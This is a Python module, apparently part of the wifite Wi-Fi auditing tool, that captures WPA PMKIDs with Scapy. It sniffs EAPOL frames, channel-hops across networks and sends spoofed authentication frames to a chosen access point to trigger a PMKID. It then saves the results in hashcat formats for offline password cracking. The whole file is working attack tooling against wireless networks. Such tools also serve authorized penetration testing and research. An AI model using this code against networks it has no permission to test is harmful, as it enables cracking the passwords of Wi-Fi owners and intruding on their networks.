#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Native PMKID capture using Scapy.

Captures PMKID from EAPOL Message 1 frames (RSN PMKID in key data).
This provides a lightweight alternative to hcxdumptool for basic PMKID capture.

Usage:
    from wifite.native.pmkid import ScapyPMKID
    
    # Capture PMKID for specific target
    result = ScapyPMKID.capture('wlan0mon', 'AA:BB:CC:DD:EE:FF', timeout=30)
    
    # Passive scan for PMKIDs on multiple networks
    pmkids = ScapyPMKID.passive_scan('wlan0mon', duration=60)

PMKID Location in EAPOL M1:
    - RSN IE (vendor-specific) in Key Data field
    - PMKID List is at offset after RSN capabilities
    - PMKID is 16 bytes

Output Format (hashcat mode 22000):
    WPA*02*PMKID*MAC_AP*MAC_STA*ESSID_HEX***

Note: This is a simplified implementation. For production use with
difficult targets, hcxdumptool is recommended as it handles edge cases
and has better driver compatibility.
"""

import time
import binascii
from threading import Thread, Event
from typing import Optional, List, Callable
from dataclasses import dataclass

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Auth,
        Dot11AssoReq, Dot11AssoResp, Dot11Elt, EAPOL, Raw,
        sniff, sendp, conf as scapy_conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


@dataclass
class PMKIDResult:
    """Container for captured PMKID."""
    bssid: str
    client_mac: str
    pmkid: str  # Hex string
    essid: Optional[str] = None
    channel: Optional[int] = None
    timestamp: Optional[float] = None
    
    def to_hashcat_22000(self) -> str:
        """
        Convert to hashcat 22000 format.
        
        Format: WPA*02*PMKID*MAC_AP*MAC_STA*ESSID_HEX***
        """
        essid_hex = binascii.hexlify(
            self.essid.encode('utf-8') if self.essid else b''
        ).decode('ascii')
        
        mac_ap = self.bssid.replace(':', '').lower()
        mac_sta = self.client_mac.replace(':', '').lower()
        pmkid = self.pmkid.lower()
        
        return f"WPA*02*{pmkid}*{mac_ap}*{mac_sta}*{essid_hex}***"
    
    def to_hashcat_16800(self) -> str:
        """
        Convert to legacy hashcat 16800 format.
        
        Format: PMKID*MAC_AP*MAC_STA*ESSID_HEX
        """
        essid_hex = binascii.hexlify(
            self.essid.encode('utf-8') if self.essid else b''
        ).decode('ascii')
        
        mac_ap = self.bssid.replace(':', '').lower()
        mac_sta = self.client_mac.replace(':', '').lower()
        pmkid = self.pmkid.lower()
        
        return f"{pmkid}*{mac_ap}*{mac_sta}*{essid_hex}"


class ScapyPMKID:
    """
    Native PMKID capture using Scapy.
    
    Captures PMKID from the RSN IE in EAPOL Message 1 frames.
    This occurs during the initial 4-way handshake when the AP
    sends its PMKID to the client.
    
    Advantages over hcxdumptool:
    - No external binary required
    - Pure Python implementation
    - Better portability
    
    Limitations:
    - Less efficient than hcxdumptool for large-scale captures
    - May miss PMKIDs on some drivers
    - Doesn't handle all edge cases
    """
    
    # RSN IE identifiers
    RSN_IE_ID = 48  # RSN Information Element
    VENDOR_SPECIFIC_IE = 221
    
    # PMKID is 16 bytes
    PMKID_LEN = 16
    
    # OUI for PMKID in RSN IE
    RSN_PMKID_OUI = b'\x00\x0f\xac\x04'  # PMKID
    
    @classmethod
    def is_available(cls) -> bool:
        """Check if Scapy is available."""
        return SCAPY_AVAILABLE
    
    @classmethod
    def capture(cls,
                interface: str,
                bssid: str,
                essid: Optional[str] = None,
                client_mac: Optional[str] = None,
                timeout: int = 30,
                send_auth: bool = True,
                channel: Optional[int] = None,
                callback: Optional[Callable[[PMKIDResult], None]] = None) -> Optional[PMKIDResult]:
        """
        Capture PMKID for a specific target.
        
        Optionally sends authentication frames to trigger PMKID response.
        
        Args:
            interface: Monitor mode interface
            bssid: Target AP BSSID
            essid: Target ESSID (optional, will be detected if not provided)
            client_mac: Client MAC to use (optional, uses interface MAC)
            timeout: Capture timeout in seconds
            send_auth: If True, send auth frames to trigger response
            channel: Channel to use (optional)
            callback: Function called when PMKID is captured
            
        Returns:
            PMKIDResult if captured, None otherwise
        """
        if not SCAPY_AVAILABLE:
            return None
        
        bssid = bssid.upper()
        
        # Get client MAC if not specified
        if not client_mac:
            from .mac import NativeMac
            client_mac = NativeMac.get_mac(interface) or 'DE:AD:BE:EF:CA:FE'
        client_mac = client_mac.upper()
        
        # Set channel if specified
        if channel:
            from .interface import NativeInterface
            NativeInterface.set_channel(interface, channel)
        
        # Track captured PMKID
        captured_pmkid = [None]
        detected_essid = [essid]
        
        def packet_handler(pkt):
            """Process captured packets."""
            # Look for ESSID in beacons/probe responses
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                if pkt.haslayer(Dot11):
                    pkt_bssid = (pkt[Dot11].addr3 or '').upper()
                    if pkt_bssid == bssid and not detected_essid[0]:
                        # Extract ESSID
                        elt = pkt.getlayer(Dot11Elt)
                        while elt:
                            if elt.ID == 0:  # SSID
                                try:
                                    detected_essid[0] = elt.info.decode('utf-8', errors='replace')
                                except (UnicodeDecodeError, AttributeError):
                                    pass
                                break
                            elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None
            
            # Look for EAPOL frames
            if not pkt.haslayer(EAPOL):
                return
            
            if not pkt.haslayer(Dot11):
                return
            
            dot11 = pkt[Dot11]
            eapol = pkt[EAPOL]
            
            # EAPOL-Key (type 3)
            if eapol.type != 3:
                return
            
            # Check direction: we want AP -> Client (our MAC)
            src = (dot11.addr2 or '').upper()
            dst = (dot11.addr1 or '').upper()
            
            if src != bssid:
                return
            
            # Extract PMKID from EAPOL-Key frame
            pmkid = cls._extract_pmkid(pkt)
            if pmkid:
                result = PMKIDResult(
                    bssid=bssid,
                    client_mac=dst,
                    pmkid=pmkid,
                    essid=detected_essid[0],
                    channel=channel,
                    timestamp=time.time()
                )
                captured_pmkid[0] = result
                
                if callback:
                    callback(result)
        
        # Start capture in background
        stop_event = Event()
        
        def capture_thread():
            try:
                sniff(
                    iface=interface,
                    prn=packet_handler,
                    store=False,
                    timeout=timeout,
                    stop_filter=lambda _: stop_event.is_set() or captured_pmkid[0] is not None
                )
            except (AttributeError, TypeError, IndexError):
                pass
        
        capture = Thread(target=capture_thread)
        capture.daemon = True
        capture.start()
        
        # Send authentication frames to trigger PMKID
        if send_auth:
            auth_interval = 2  # seconds between auth attempts
            auth_count = timeout // auth_interval
            
            for i in range(auth_count):
                if captured_pmkid[0]:
                    break
                
                try:
                    cls._send_auth_request(interface, bssid, client_mac)
                except (OSError, AttributeError):
                    pass
                
                time.sleep(auth_interval)
        
        # Wait for capture to complete
        capture.join(timeout=timeout + 5)
        stop_event.set()
        
        return captured_pmkid[0]
    
    @classmethod
    def passive_scan(cls,
                     interface: str,
                     duration: int = 60,
                     bssid_filter: Optional[str] = None,
                     callback: Optional[Callable[[PMKIDResult], None]] = None) -> List[PMKIDResult]:
        """
        Passively scan for PMKIDs on multiple networks.
        
        Listens for EAPOL Message 1 frames without sending any packets.
        Useful for capturing PMKIDs from networks with active clients.
        
        Args:
            interface: Monitor mode interface
            duration: Scan duration in seconds
            bssid_filter: Optional BSSID to filter (None = all)
            callback: Function called for each captured PMKID
            
        Returns:
            List of captured PMKIDResults
        """
        if not SCAPY_AVAILABLE:
            return []
        
        bssid_filter = bssid_filter.upper() if bssid_filter else None
        
        # Track results and ESSIDs
        results = []
        essid_cache = {}  # bssid -> essid
        seen_pmkids = set()  # Avoid duplicates
        
        def packet_handler(pkt):
            # Cache ESSIDs from beacons
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                if pkt.haslayer(Dot11):
                    pkt_bssid = (pkt[Dot11].addr3 or '').upper()
                    if pkt_bssid not in essid_cache:
                        elt = pkt.getlayer(Dot11Elt)
                        while elt:
                            if elt.ID == 0:
                                try:
                                    essid_cache[pkt_bssid] = elt.info.decode('utf-8', errors='replace')
                                except (UnicodeDecodeError, AttributeError):
                                    pass
                                break
                            elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None

            # Look for EAPOL
            if not pkt.haslayer(EAPOL):
                return
            
            if not pkt.haslayer(Dot11):
                return
            
            dot11 = pkt[Dot11]
            eapol = pkt[EAPOL]
            
            if eapol.type != 3:
                return
            
            src = (dot11.addr2 or '').upper()
            dst = (dot11.addr1 or '').upper()
            
            if bssid_filter and src != bssid_filter:
                return
            
            pmkid = cls._extract_pmkid(pkt)
            if pmkid:
                key = (src, dst, pmkid)
                if key in seen_pmkids:
                    return
                seen_pmkids.add(key)
                
                result = PMKIDResult(
                    bssid=src,
                    client_mac=dst,
                    pmkid=pmkid,
                    essid=essid_cache.get(src),
                    timestamp=time.time()
                )
                results.append(result)
                
                if callback:
                    callback(result)
        
        try:
            sniff(
                iface=interface,
                prn=packet_handler,
                store=False,
                timeout=duration
            )
        except (OSError, AttributeError):
            pass
        
        return results
    
    @classmethod
    def _extract_pmkid(cls, pkt) -> Optional[str]:
        """
        Extract PMKID from EAPOL-Key frame.
        
        PMKID is in the RSN PMKID List within the Key Data field.
        
        Args:
            pkt: Scapy packet with EAPOL layer
            
        Returns:
            PMKID as hex string, or None if not found
        """
        try:
            eapol = pkt[EAPOL]
            
            # Get raw packet data after EAPOL header
            if pkt.haslayer(Raw):
                raw = bytes(pkt[Raw])
            else:
                return None
            
            # EAPOL-Key frame structure:
            # Key Descriptor Type (1) + Key Information (2) + Key Length (2) +
            # Key Replay Counter (8) + Key Nonce (32) + Key IV (16) +
            # Key RSC (8) + Key ID (8) + Key MIC (16) + Key Data Length (2) + Key Data
            
            if len(raw) < 77:  # Minimum for EAPOL-Key with some data
                return None
            
            # Key Data Length is at offset 77 (2 bytes, big-endian)
            key_data_len = (raw[76] << 8) | raw[77] if len(raw) > 77 else 0
            
            if key_data_len == 0:
                return None
            
            # Key Data starts at offset 78
            key_data = raw[78:78 + key_data_len] if len(raw) >= 78 + key_data_len else b''
            
            if not key_data:
                return None
            
            # Parse Key Data for PMKID
            # Look for RSN PMKID (OUI 00:0f:ac type 04)
            pmkid = cls._find_pmkid_in_key_data(key_data)
            
            return pmkid

        except (AttributeError, TypeError, IndexError):
            return None
    
    @classmethod
    def _find_pmkid_in_key_data(cls, key_data: bytes) -> Optional[str]:
        """
        Find PMKID in Key Data field.
        
        Key Data may contain:
        - RSN Information Element (ID 48)
        - Vendor-specific IEs
        - GTK KDE
        - PMKID KDE (OUI 00:0f:ac type 04)
        
        Args:
            key_data: Raw Key Data bytes
            
        Returns:
            PMKID hex string or None
        """
        offset = 0
        
        while offset + 2 <= len(key_data):
            # KDE format: Type (1) + Length (1) + OUI (3) + Data Type (1) + Data
            kde_type = key_data[offset]
            
            if kde_type == 0xdd:  # Vendor-specific KDE
                if offset + 2 > len(key_data):
                    break
                    
                kde_len = key_data[offset + 1]
                
                if offset + 2 + kde_len > len(key_data):
                    break
                
                kde_data = key_data[offset + 2:offset + 2 + kde_len]
                
                # Check for PMKID KDE: OUI 00:0f:ac, Type 04
                if len(kde_data) >= 4:
                    oui = kde_data[:3]
                    data_type = kde_data[3]
                    
                    if oui == b'\x00\x0f\xac' and data_type == 0x04:
                        # PMKID follows (16 bytes)
                        if len(kde_data) >= 20:  # 4 header + 16 PMKID
                            pmkid = kde_data[4:20]
                            return binascii.hexlify(pmkid).decode('ascii')
                
                offset += 2 + kde_len
                
            elif kde_type == 0x30:  # RSN IE
                if offset + 2 > len(key_data):
                    break
                    
                rsn_len = key_data[offset + 1]
                
                # Parse RSN IE for PMKID List
                rsn_data = key_data[offset + 2:offset + 2 + rsn_len]
                pmkid = cls._parse_rsn_ie_for_pmkid(rsn_data)
                if pmkid:
                    return pmkid
                
                offset += 2 + rsn_len
            else:
                # Skip unknown type
                if offset + 2 > len(key_data):
                    break
                length = key_data[offset + 1]
                offset += 2 + length
        
        return None
    
    @classmethod
    def _parse_rsn_ie_for_pmkid(cls, rsn_data: bytes) -> Optional[str]:
        """
        Parse RSN IE to find PMKID List.
        
        RSN IE structure:
        - Version (2)
        - Group Cipher Suite (4)
        - Pairwise Cipher Suite Count (2)
        - Pairwise Cipher Suites (4 * count)
        - AKM Suite Count (2)
        - AKM Suites (4 * count)
        - RSN Capabilities (2)
        - PMKID Count (2)
        - PMKID List (16 * count)
        
        Args:
            rsn_data: RSN IE data (after ID and length)
            
        Returns:
            First PMKID hex string or None
        """
        try:
            if len(rsn_data) < 8:
                return None
            
            offset = 2  # Skip version
            
            # Skip Group Cipher Suite (4 bytes)
            offset += 4
            
            if offset + 2 > len(rsn_data):
                return None
            
            # Pairwise Cipher Suite Count
            pairwise_count = (rsn_data[offset] | (rsn_data[offset + 1] << 8))
            offset += 2
            
            # Skip Pairwise Cipher Suites
            offset += 4 * pairwise_count
            
            if offset + 2 > len(rsn_data):
                return None
            
            # AKM Suite Count
            akm_count = (rsn_data[offset] | (rsn_data[offset + 1] << 8))
            offset += 2
            
            # Skip AKM Suites
            offset += 4 * akm_count
            
            if offset + 2 > len(rsn_data):
                return None
            
            # RSN Capabilities
            offset += 2
            
            if offset + 2 > len(rsn_data):
                return None
            
            # PMKID Count
            pmkid_count = (rsn_data[offset] | (rsn_data[offset + 1] << 8))
            offset += 2
            
            if pmkid_count == 0:
                return None
            
            # Get first PMKID
            if offset + 16 > len(rsn_data):
                return None
            
            pmkid = rsn_data[offset:offset + 16]
            return binascii.hexlify(pmkid).decode('ascii')

        except (AttributeError, TypeError, IndexError):
            return None
    
    @classmethod
    def _send_auth_request(cls, interface: str, bssid: str, client_mac: str):
        """
        Send authentication request frame to trigger PMKID response.
        
        Args:
            interface: Monitor mode interface
            bssid: Target AP BSSID
            client_mac: Client MAC address to use
        """
        # Build authentication frame (Open System)
        auth_frame = (
            RadioTap() /
            Dot11(
                type=0,      # Management
                subtype=11,  # Authentication
                addr1=bssid,       # Destination (AP)
                addr2=client_mac,  # Source (us)
                addr3=bssid        # BSSID
            ) /
            Dot11Auth(
                algo=0,   # Open System
                seqnum=1, # Sequence number 1
                status=0  # Success
            )
        )
        
        sendp(auth_frame, iface=interface, verbose=False, count=3)
    
    @classmethod
    def save_to_file(cls, 
                     results: List[PMKIDResult], 
                     filename: str,
                     format: str = '22000') -> bool:
        """
        Save PMKIDs to file in hashcat format.
        
        Args:
            results: List of PMKIDResult objects
            filename: Output filename
            format: '22000' (default) or '16800' (legacy)
            
        Returns:
            True if successful
        """
        try:
            with open(filename, 'w') as f:
                for result in results:
                    if format == '16800':
                        line = result.to_hashcat_16800()
                    else:
                        line = result.to_hashcat_22000()
                    f.write(line + '\n')
            return True
        except (OSError, IOError):
            return False


class PMKIDCapture(Thread):
    """
    Background PMKID capture thread.
    
    Continuously captures PMKIDs while channel hopping.
    """
    
    def __init__(self,
                 interface: str,
                 channels: Optional[List[int]] = None,
                 bssid_filter: Optional[str] = None,
                 callback: Optional[Callable[[PMKIDResult], None]] = None):
        """
        Initialize PMKID capture thread.
        
        Args:
            interface: Monitor mode interface
            channels: List of channels to hop (None = 2.4GHz channels 1-11)
            bssid_filter: Optional BSSID filter
            callback: Function called for each PMKID
        """
        super().__init__()
        self.daemon = True
        
        self.interface = interface
        self.channels = channels or list(range(1, 12))
        self.bssid_filter = bssid_filter.upper() if bssid_filter else None
        self.callback = callback
        
        self._stop_event = Event()
        self.results = []
        self.seen_pmkids = set()
        self.essid_cache = {}
        
        # Stats
        self.packets_processed = 0
        self.start_time = None
    
    def run(self):
        """Main capture loop with channel hopping."""
        if not SCAPY_AVAILABLE:
            return
        
        self.start_time = time.time()
        channel_idx = 0
        
        from .interface import NativeInterface
        
        while not self._stop_event.is_set():
            # Set channel
            channel = self.channels[channel_idx]
            NativeInterface.set_channel(self.interface, channel)
            
            # Capture on this channel for a bit
            try:
                sniff(
                    iface=self.interface,
                    prn=self._packet_handler,
                    store=False,
                    timeout=0.5,  # Short timeout for quick channel hopping
                    stop_filter=lambda _: self._stop_event.is_set()
                )
            except (AttributeError, TypeError, IndexError):
                pass
            
            # Next channel
            channel_idx = (channel_idx + 1) % len(self.channels)
    
    def _packet_handler(self, pkt):
        """Process captured packet."""
        self.packets_processed += 1
        
        # Cache ESSIDs
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            if pkt.haslayer(Dot11):
                pkt_bssid = (pkt[Dot11].addr3 or '').upper()
                if pkt_bssid not in self.essid_cache:
                    elt = pkt.getlayer(Dot11Elt)
                    while elt:
                        if elt.ID == 0:
                            try:
                                self.essid_cache[pkt_bssid] = elt.info.decode('utf-8', errors='replace')
                            except (UnicodeDecodeError, AttributeError):
                                pass
                            break
                        elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None

        # Look for EAPOL
        if not pkt.haslayer(EAPOL):
            return
        
        if not pkt.haslayer(Dot11):
            return
        
        dot11 = pkt[Dot11]
        eapol = pkt[EAPOL]
        
        if eapol.type != 3:
            return
        
        src = (dot11.addr2 or '').upper()
        dst = (dot11.addr1 or '').upper()
        
        if self.bssid_filter and src != self.bssid_filter:
            return
        
        pmkid = ScapyPMKID._extract_pmkid(pkt)
        if pmkid:
            key = (src, dst, pmkid)
            if key in self.seen_pmkids:
                return
            self.seen_pmkids.add(key)
            
            result = PMKIDResult(
                bssid=src,
                client_mac=dst,
                pmkid=pmkid,
                essid=self.essid_cache.get(src),
                timestamp=time.time()
            )
            self.results.append(result)
            
            if self.callback:
                self.callback(result)
    
    def stop(self):
        """Stop capture."""
        self._stop_event.set()
        if self.is_alive():
            self.join(timeout=2)
    
    def get_results(self) -> List[PMKIDResult]:
        """Get captured PMKIDs."""
        return self.results.copy()
    
    def get_stats(self) -> dict:
        """Get capture statistics."""
        elapsed = time.time() - self.start_time if self.start_time else 0
        return {
            'pmkids_captured': len(self.results),
            'packets_processed': self.packets_processed,
            'elapsed_time': elapsed,
            'running': not self._stop_event.is_set()
        }


# Convenience functions
def capture_pmkid(interface: str, bssid: str, timeout: int = 30) -> Optional[PMKIDResult]:
    """Capture PMKID for specific target."""
    return ScapyPMKID.capture(interface, bssid, timeout=timeout)


def passive_scan(interface: str, duration: int = 60) -> List[PMKIDResult]:
    """Passively scan for PMKIDs."""
    return ScapyPMKID.passive_scan(interface, duration=duration)


def is_available() -> bool:
    """Check if native PMKID capture is available."""
    return SCAPY_AVAILABLE
